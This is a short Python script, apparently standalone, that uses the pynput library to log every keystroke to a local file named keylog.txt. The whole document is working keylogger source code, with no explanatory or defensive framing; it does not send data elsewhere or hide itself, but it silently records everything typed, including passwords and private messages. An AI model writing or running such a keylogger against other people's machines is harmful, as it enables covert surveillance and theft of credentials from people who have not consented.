from pynput import keyboard
import time

def on_press(key):
    with open('keylog.txt', 'a') as f:
        f.write(str(key))
        f.write('\n')

def on_release(key):
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()